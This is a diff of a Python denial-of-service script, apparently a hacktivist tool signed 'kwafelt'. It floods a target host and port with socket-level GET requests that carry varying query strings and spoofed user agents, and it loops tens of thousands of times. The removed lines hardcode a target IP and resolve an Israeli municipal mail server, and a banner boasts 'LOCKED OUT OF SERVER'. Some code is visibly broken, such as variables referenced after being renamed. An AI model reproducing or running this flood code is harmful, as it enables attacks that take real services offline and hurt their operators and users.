@@ -1,33 +1,24 @@
 #!/usr/bin/env python3
 #
 import hashlib, json, os, platform, random, requests, socket, sys, time ,uuid
-from datetime import datetime
 from threading import Timer
 #
 hello = '''
 
-       ██   ██  █████  ███    ██ ███    ██  █████  
-       ██   ██ ██   ██ ████   ██ ████   ██ ██   ██ 
-       ███████ ███████ ██ ██  ██ ██ ██  ██ ███████ 
-       ██   ██ ██   ██ ██  ██ ██ ██  ██ ██ ██   ██ 
-       ██   ██ ██   ██ ██   ████ ██   ████ ██   ██ 
-                                            
-               ███████  ██████  ███████ ███████  █████     
-               ██      ██    ██ ██      ██      ██   ██    
-               ███████ ██    ██ █████   █████   ███████    
-                    ██ ██    ██ ██      ██      ██   ██    
-               ███████  ██████  ██      ███████ ██   ██    
-
+       ██   ██ ███    ██ ███    ██ ███████ ███████ ███████  █████     
+    ██ ██   ██ ████   ██ ████   ██ ██      ██      ██      ██   ██ ██ 
+       ███████ ██ ██  ██ ██ ██  ██ ███████ █████   █████   ███████    
+    ██ ██   ██ ██  ██ ██ ██  ██ ██      ██ ██      ██      ██   ██ ▄█ 
+       ██   ██ ██   ████ ██   ████ ███████ ██      ███████ ██   ██ ▀  
+                                                                      
+                                                                      
 '''
-
-w1 = '\tLOCKED OUT OF SERVER; kwafeLt wAS hERE..'
-w2 = '\thttps://dragonforce.io/members/kwafelt.30011/'
-w3 = '\thttps://www.instagram.com/kwafelt/?'
-w4 = f'https://cookieleaks.onion/?landing=default.htm&session=temp'
+wr = ["LOCKED OUT OF SERVER; kwafeLt wAS hERE..","written by kwafelt"]
+ws = ["https://kwafelt.github.io/?stt=raw","https://www.instagram.com/kwafelt/","dragonforce.io/members/30011/"]
 
 Browser_identification = 'Chrome/104.0.5112.102 OPR/90.0.4480.80'
-ps4 = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)'
-user_agent = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'
+user_agent = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)' # PS4
+user_agent2 = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'
 
 station = socket.gethostname();
 address = socket.gethostbyname(station)
@@ -38,6 +29,7 @@ admin = str(admin).replace('K', 'k').replace('l', 'L')
 MAC = hex(uuid.getnode());
 slEEp = 0.75
 
+BLOB = True
 ROOT = [""]
 #STAT = [socket.gethostname(),socket.gethostbyname(STAT[0])]
 HTTP = ['HTTP/1.0','HTTP/1.1','h2']
@@ -49,13 +41,6 @@ target_port = None
 
 p1 = [sys.argv[0], "",""]
 
-#
-
-def dev():
-    data = 'mail.tel-aviv.gov.il'
-    print(socket.gethostbyname(data))
-
-
 TARGET_IP = '80.179.151.134'; status = 'dorman'
 #
 workstation = "Hanna Sofea's comrade";
@@ -64,7 +49,6 @@ txt = ["","written by kwafelt"]
 inject = 'Injecting process';
 question = 'Do you want to continue ?'
 confirm = ['Do you want to continue ?','Is this ok ?']
-
 
 # parse_input
 num_requests = 0;
@@ -89,16 +73,11 @@ def ossys(c):
 def timer(c):
   Timer(c, parse).start()
 
-def ctim3(c):
-  waktu = datetime.now() # current date and time
-  if (c == 0):
-    strtim3 = waktu.strftime('%y/%m/%d %H:%M:%S')
-  if (c == 1):
-    strtim3 = waktu.strftime('%f')
-  if (c == 2):
-    day_of_year = waktu.timetuple().tm_yday  # day_of_year
-    strtim3 = day_of_year
-  return strtim3
+def ctime(c):
+  ctime_tuple = time.localtime() # get struct_time
+  time_string = time.strftime("%y/%m/%d %H:%M:%S", ctime_tuple)
+  datetime = str(time_string)
+  return datetime
 
 def hash5(txt):
   str2hash = txt
@@ -128,7 +107,7 @@ def parse(init):
     target_port = int(sys.argv[2]); p1[2] = target_port
     verif(init)
   else:
-    write(f'\r\n Usage: {sys.argv[0]} <target_host> <target_host>')
+    write(f'\r\n Usage: {sys.argv[0]} <target_host> <target_port>')
     write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n')
     reset(init); sys.exit(init)
 
@@ -144,12 +123,13 @@ def verif(init):
 
 def start(init):
   ossys('setterm --foreground cyan --background black --cursor on')
-  ossys('clear');
-  title('start'); write(f"{color(248,152,128,hello)}")
+  ossys('clear'); title('start'); write(f"\t{color(248,152,128,hello)}")
+  write(f"\r\n\t{wr[0]}\n\n\t{ws[0]}\n\t{ws[1]}\n\t{ws[2]}\n\n\t{wr[1]}\n")
+  
   accss('access code')
 
 def accss(text):
-  reply = input(f"\r\n {color(248,152,128,text)}  :  ")
+  reply = input(f"\r\n\t{color(248,152,128,text)}  :  ")
   if (reply == 'bypass') or (reply == '30011') or (reply == '2022'):
     press(0)
   else: accss('  try again')
@@ -187,11 +167,11 @@ def recon(c):
   ossys('setterm --background black --cursor off')
   ossys('clear')
   title('prcss')
-  tx1 = ctim3(0)
+  tx1 = ctime(0)
   tx2 = f"{inject}.."
   pst = print_status()
   pst.initial(tx1, tx2)
-  process(15400);
+  process(0);
   
 ################################################################################
 def ipapi(i):
@@ -230,109 +210,58 @@ def address(LAN):
     return addr
 
 ###############################################################################
-
 class print_status():
-    def initial(self, time, txt1):
-        tx1 = color(245, 215, 0, time);
-        tx2 = color(99, 99, 99, 'Initial');
-        tx3 = color(255, 215, 0, txt1);
-        sys.stdout.write(f'\r {tx1} {tx2} {tx3}\r');
-
-    def success(self, time, txt1):
-        tx1 = color(224,191,184, time);
-        tx2 = color(218,112,214, 'Success');
-        tx3 = color(248,152,128, txt1);
-        tx4 = color(224,191,184, v4L);
-        sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
-
-    def timeout(self, time, txt1):
-        tx1 = color(224,191,184, time);
-        tx2 = color(255, 215, 0, 'Timeout');
-        tx3 = '> ERR_CONNECTION_TIMEOUT_ERR';
-        tx4 = color(0, 110, 210, '< RECONNECTING');
-        sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
-
-    def failure(self, time, txt1):
-        tx1 = color(145, 145, 145, time);
-        tx2 = color(245, 110, 110, 'Failure');
-        tx3 = color(255, 215, 0, 'No connection > server may be down');
-        tx4 = color(224,191,184, '< RECONNECTING');
-        sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
-
-    flag = 'ssl{kwafeLt_wAS_hERE}';
+  def initial(self, txt0, txt1):
+    tx1 = color(245, 215, 0, txt0);
+    tx2 = color(99, 99, 99, 'Initial');
+    tx3 = color(255, 215, 0, txt1);
+    sys.stdout.write(f'\r {tx1} {tx2} {tx3}\r');
+  def success(self, txt0, txt1):
+    tx1 = color(224,191,184, txt0);
+    tx2 = color(218,112,214, 'Success');
+    tx3 = color(248,152,128, txt1);
+    tx4 = color(224,191,184, v4L);
+    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
+  def timeout(self, txt0, txt1):
+    tx1 = color(224,191,184, txt0);
+    tx2 = color(245, 245, 245, 'Timeout');
+    tx3 = color(245,215,0,'[--ERR_CONNECTION_TIMEOUT_ERR--]')
+    tx4 = color(0, 110, 210, '[-RECONNECTING-]');
+    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
+  def failure(self, txt0, txt1):
+    tx1 = color(145, 145, 145, txt0);
+    tx2 = color(245, 110, 110, 'Failure');
+    tx3 = color(245, 1, 1, 'No connection SERVER MAY BE DOWN');
+    tx4 = color(245,110,110, "[-!CLOSE-EVENT-]");
+    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
+  flag = 'ctf{kwafeLt_wAS_hERE}';
 
 ###############################################################################
 
-def connect_h2_socket(host):
-  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  context = ssl.create_default_context()
-  context.set_alpn_protocols(["h2"])
-  sock.connect((host, 443))
-  sock = context.wrap_socket(sock, server_hostname=host)
-  return sock
-def grow():
-  s.sendall("GET / HTTP/1.1\r\nHost: github.com\r\nConnection: close\r\n\r\n")
-  s = connect_h2_socket("1.1.1.1")
-  print("Selected protocol:", s.selected_alpn_protocol())
-  print(s.recv())
-
-def attackORIG(init):
-    global slEEp;
-    time.sleep(slEEp);
-    time1 =ctim3(0);
-    time2 =ctim3(1);
-    hexd = hash5(time2);
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
-        try:
-            address = (target_host, target_port);
-            proc.connect(address)
-            proc.settimeout(1.5)  # saat
-            proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {proxy}\r\n').encode('ascii'), address);
-            proc.sendto((f'User-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
-            proc.sendto((f'Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
-            proc.sendto((f'Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
-            #
-            if (init == 'debug'): response = proc.recv(4096); print(f'\r\n' + response.decode('ascii'))
-            # num = recv(s, addr_of_buffer, len_of_buffer, 0);
-            #
-            proc.shutdown(socket.SHUT_RDWR);
-            proc.close();
-            slEEp = 0.02;
-            st = print_status();
-            st.success(time1, hexd)
-        except socket.timeout:
-            slEEp = 0.50;
-            st = print_status();
-            st.timeout(time1, None)
-        except socket.error:
-            slEEp = 1.00;
-            st = print_status();
-            st.failure(time1, None)
-        except (KeyboardInterrupt, SystemExit):
-            sys.exit(0);
-        finally:
-            pass;
-    return slEEp;
-
 def attack(init):
-  global slEEp; time1 = ctim3(0); data = cdata(9)
+  global BLOB
+  global slEEp; data = cdata(init)
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
     try:
-      address = (target_host, target_port); proc.connect(address); proc.settimeout(2)
-      bytes1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nUser-Agent: {user_agent}\r\n'
-      bytes2 = f'Accept-Encoding: gzip, deflate\r\nConnection: {CONN[1]}\r\n\r\n'
-      proc.sendto((bytes1).encode('ascii'), address)
-      proc.sendto((bytes2).encode('ascii'), address)
+      address = (target_host, target_port); proc.settimeout(1.0)
+      proc.connect(address)
+      b1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nUser-Agent: {user_agent}\r\n'
+      b2 = f'Accept-Encoding: gzip, deflate\r\nAccept: text/plain,*/*\r\n'
+      b3 = f'Connection: {CONN[1]}\r\nKeep-Alive: timeout=15, max=100\r\n\r\n'
+      proc.sendto((b1).encode('ascii'), address)
+      proc.sendto((b2).encode('ascii'), address)
+      proc.sendto((b3).encode('ascii'), address)
       if (init == 'debug'):
         response = proc.recv(4096); print(bytes1,bytes2); print(f'\r\n' + response.decode('ascii'))
         print(f'receiving {len(response)} bytes data...')
       #response = proc.recv(4096) # D O R M A N
-      proc.shutdown(socket.SHUT_RDWR); proc.close()
-      slEEp = 0.02; st = print_status(); st.success(time1, data)
+      proc.shutdown(socket.SHUT_RDWR)
+      proc.close()
+      st = print_status(); st.success(ctime(0), data); BLOB = True
     except socket.timeout:
-      slEEp = 0.50; st = print_status(); st.timeout(time1, None)
+      st = print_status(); st.timeout(ctime(0), data); BLOB = False
     except socket.error:
-      slEEp = 1.00; st = print_status(); st.failure(time1, None)
+      st = print_status(); st.failure(ctime(0), None); BLOB = False
     except (KeyboardInterrupt, SystemExit):
       sys.exit(0)
     finally: pass
@@ -346,9 +275,9 @@ def process_b(i):
     # ..D.O.R.M.A.N..
 
 def process(i):
-  while (i < 54001):
-    if (i == 54000):
-      i += 1
+  global BLOB
+  while (BLOB):
+    if (i > 72540):
       time.sleep(1.0)
       flag = '10v3{5h371x1}'
       tx1 = color(204,204,255,f'COMPLETED / ETA {i} / {flag} / FINN')
@@ -356,15 +285,20 @@ def process(i):
       break
     else:
       try:
-        attack(i);  # Timer(slEEp,attack).start();
+        attack(i)
       except (KeyboardInterrupt, SystemExit):
-        tx1 = color(204,204,255,f'ETA {i} / CTRL-C PRESSED / KEYBOARD INTERRUPT')
-        write(f'\r\n\n {tx1}\r\n')
+        R = color(204,204,255,f'ETA {i} / CTRL-C PRESSED / KEYBOARD INTERRUPT')
+        write(f'\r\n\n {R}\r\n')
         sys.exit(0);
       finally: pass
+    i = i + 1
+  else:
+    BLOB = True
+    time.sleep(1)
+    process(i)# Timer(slEEp,attack).start()
 ################################################################################
 try:
-  parse(0); cdata(0)
+  parse(0); BLOB = True
 except (KeyboardInterrupt, IOError, OSError):
   tx1 = color(204,204,255,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..');
   write(f'\n {tx1}\r\n'); sys.exit(0)
